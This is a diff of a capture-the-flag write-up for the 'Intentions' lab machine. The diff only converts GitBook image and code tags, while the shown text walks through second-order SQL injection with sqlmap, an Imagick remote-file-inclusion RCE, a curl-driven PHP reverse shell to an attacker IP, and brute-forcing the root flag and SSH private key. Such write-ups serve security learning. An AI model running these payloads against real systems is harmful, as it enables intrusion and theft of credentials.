@@ -21,11 +21,10 @@ We don't need to add any domains for this machine. Since only port 80 is open, w
 
 Port 80 reveals a basic login page:
 
-<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1154).png>)
 
 The HTTP requests sent when visiting this page are rather interesting:
 
-{% code overflow="wrap" %}
 ```http
 GET / HTTP/1.1
 Host: 10.129.19.213
@@ -38,23 +37,22 @@ Cookie: XSRF-TOKEN=eyJpdiI6InJqcUJXNjhydWtBVm5vbUgwbTlHS2c9PSIsInZhbHVlIjoialliM
 Upgrade-Insecure-Requests: 1
 
 ```
-{% endcode %}
 
 So there are some forms of `base64` encoded cookies involved in this website. Anyways, I registered a new user and logged in to view the gallery:
 
-<figure><img src="../../.gitbook/assets/image (1294).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1294).png>)
 
 When we login, there is an extra cookie called `token` that is being assigned. It's a JWT token with this value:
 
-<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(213).png>)
 
 Again, not sure what to do with this yet. We can click on the 'Gallery' option to see the traffic generated:
 
-<figure><img src="../../.gitbook/assets/image (3538).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3538).png>)
 
 From the looks of it, it seems that the backend uses some kind of SQL database based on the data returned. When we view our 'Profile', we can see that there is an option to update it with our favourite genres:
 
-<figure><img src="../../.gitbook/assets/image (2738).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2738).png>)
 
 This sends this POST request to the backend:
 
@@ -109,13 +107,11 @@ by Ben "epi" Risher 🤓                 ver: 2.7.1
 
 Within the `admin.js` file, when we search for the string 'password', we can see this comment at the bottom:
 
-{% code overflow="wrap" %}
 ```
 Hey team, I've deployed the v2 API to production and have started using it in the admin section. \n                Let me know if you spot any bugs. \n                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text! \n                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.\n                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.\n
 
 The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I've included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some :)
 ```
-{% endcode %}
 
 So the API takes the calculated hashed password of the user and passes it for authentication, meaning that if we were to get hashes, we don't actually need to crack them at all. This v2 API looks rather suspicious, but I was unable to interact with it much as no directory scans were returning anything useful.
 
@@ -125,15 +121,13 @@ This was when I got stuck.
 
 The only point of weakness seems to be that 'Genre' updating feature, so I went straight into that. When viewing the payload used my `sqlmap`, I realised it was being sent without the spaces accounted for:
 
-{% code overflow="wrap" %}
 ```
 {"genres":"food,travel,nature')ORROW(3888,4310)>(SELECTCOUNT(*),CONCAT(0x71787a7a71,(SELECT(ELT(3888=3888,1))),0x71626a6b71,FLOOR(RAND(0)*2))xFROM(SELECT2102UNIONSELECT1050UNIONSELECT3584UNIONSELECT2456)aGROUPBYx)AND('PEfz'LIKE'PEfz"}
 ```
-{% endcode %}
 
 To resolve this, I used the `--tamper=space2plus` flag. While the `sqlmap` ran, I checked the other parts of the website. If we attempt to view the `/feed`, there is a weird error response captured:
 
-<figure><img src="../../.gitbook/assets/image (1950).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1950).png>)
 
 This normally didn't happen because requests to this would return images with their IDs. This highlights that the injection results might only be viewable when we send a request here instead, thus making the website potentially vulnerable to 2nd order SQL Injection:
 
@@ -231,17 +225,17 @@ $ sqlmap -r req --tamper=space2comment --batch --second-req req2 -D intentions -
 
 `greg` and `steve` are both the administrators of the website, and we have their Bcrypt hashes. I used the same method to login for the v1 API, which involved sending a POST request to `/api/v1/auth/login`, and it responds as I expected:
 
-<figure><img src="../../.gitbook/assets/image (3560).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3560).png>)
 
 Sending the correct parameters resulted in a successful login as `greg`, which generates a valid token.
 
-<figure><img src="../../.gitbook/assets/image (1431).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1431).png>)
 
 ### Admin API -> RCE
 
 We can grab the `token` value we were returned on the successful login. Now, we need to find the directory about 'image editing'. We can repeat the above request in a browser, and then check the `/admin` directory, which now works properly:
 
-<figure><img src="../../.gitbook/assets/image (3191).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3191).png>)
 
 The link brings us to the PHP page for Imagick:
 
@@ -249,15 +243,14 @@ The link brings us to the PHP page for Imagick:
 
 Going to "Images" reveals that we can edit them:
 
-<figure><img src="../../.gitbook/assets/image (3564).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3564).png>)
 
 We can edit the images using 4 different effects:
 
-<figure><img src="../../.gitbook/assets/image (3555).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3555).png>)
 
 This would send a POST request to the v2 API:
 
-{% code overflow="wrap" %}
 ```http
 POST /api/v2/admin/image/modify HTTP/1.1
 Host: 10.129.19.213
@@ -278,7 +271,6 @@ Cookie: XSRF-TOKEN=eyJpdiI6IjloNURXNUpRQUNCb2tyUThhZDV1ZGc9PSIsInZhbHVlIjoiYUJZY
 
 {"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"wave"}
 ```
-{% endcode %}
 
 Googling for Imagick PHP exploits led me to this page showing an RCE:
 
@@ -290,7 +282,7 @@ The above exploit uses an RFI to load some PHP objects for RCE. We can test this
 {"path":"http://10.10.14.64/hiiamrfi","effect":"wave"}
 ```
 
-<figure><img src="../../.gitbook/assets/image (2924).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2924).png>)
 
 Since this was vulnerable to RFI, there's a high chance that it is vulnerable to the exploit above. We can follow the PoC to make it work. Firstly, we need to create a reverse shell payload within an image.
 
@@ -348,21 +340,19 @@ Content-Type: application/octet-stream
 
 Lastly, we can have a `bash` loop running to give us a reverse shell using a basic PHP reverse shell from [revshells.com](https://www.revshells.com/).
 
-{% code overflow="wrap" %}
 ```bash
 $ while true; do curl -G --data-urlencode 'a=$sock=fsockopen("10.10.14.64",4444);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' http://10.129.19.213/cmd.php 2> /dev/null; done
 ```
-{% endcode %}
 
 Then, we just need to start both the payloads within Burpsuite Intruder with NULL requests.
 
-<figure><img src="../../.gitbook/assets/image (2659).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2659).png>)
 
 When we run it both the Intruder instances, we would get a few requests to our Python HTTP server, and a reverse shell as `www-data`!
 
-<figure><img src="../../.gitbook/assets/image (3180).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3180).png>)
 
-<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(760).png>)
 
 ## Privilege Escalation
 
@@ -445,11 +435,11 @@ wget <IP>:4444/rep.tar
 
 Afterwards, we can view the `git log -p -2` output to find some credentials.
 
-<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(212).png>)
 
 We can then `su` to `greg`.
 
-<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(428).png>)
 
 ### Scanner Group -> Root Flag
 
@@ -529,7 +519,7 @@ greg@intentions:/opt/scanner$ ./scanner -p -s 2 -c /root/root.txt -l 1
 
 The resultant hash is crackable on CrackStation to give the first character of the flag:
 
-<figure><img src="../../.gitbook/assets/image (3558).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3558).png>)
 
 We can slowly brute force the `root` flag out character by character. The user flag was 33 characters, so this should be the same. I took the script from my RainyDay writeup and modified it a bit:
 
@@ -564,11 +554,9 @@ Flag is: 3
 
 I think we can do better. First, we can generate all the possible hashes of the root flag:
 
-{% code overflow="wrap" %}
 ```bash
 greg@intentions:/opt/scanner$ for i in {1..33}; do ./scanner -p -s 2 -c /root/root.txt -l $i >> /tmp/output.txt; done
 ```
-{% endcode %}
 
 We can then modify our script a bit to include the full list of hashes and brute force that instead:
 
@@ -627,7 +615,7 @@ for h in hashes:
             break
 ```
 
-<figure><img src="../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(659).png>)
 
 This would eventually get the correct hash out for us to submit.
 
@@ -635,12 +623,10 @@ This would eventually get the correct hash out for us to submit.
 
 I felt a bit weird just capturing the root flag, so let's modify our script a bit more to get the private SSH key of the `root` user.
 
-{% code overflow="wrap" %}
 ```bash
 greg@intentions:/opt/scanner$ for i in {1..3000}; do ./scanner -p -s 2 -c /root/.ssh/id_rsa -l $i >> /tmp/sshkey.txt; done 
 ## random guess of 3000 characters
 ```
-{% endcode %}
 
 The 3000 limit would trigger a lot of errors since it attempts to read more characters than actually present, so we can just Ctrl + C it when that happens. It still generates the file containing all debug hashes properly.
 
@@ -650,7 +636,7 @@ We can then transfer this to our machine via hosting the `output.txt` file on a 
 $ cat sshkey.txt | awk '{print "\"" $5 "\"\,"}' > hashes.py
 ```
 
-<figure><img src="../../.gitbook/assets/image (2732).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2732).png>)
 
 Just put this within a list like `hashes = [ <all the hashes> ]`. Afterwards, `sshkey.py` can be used to brute force the SSH key:
 
@@ -674,10 +660,10 @@ for h in hashes:
             break
 ```
 
-<figure><img src="../../.gitbook/assets/image (3190).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3190).png>)
 
 Then, just use this to `ssh` in as `root`:
 
-<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(157).png>)
 
 Rooted!
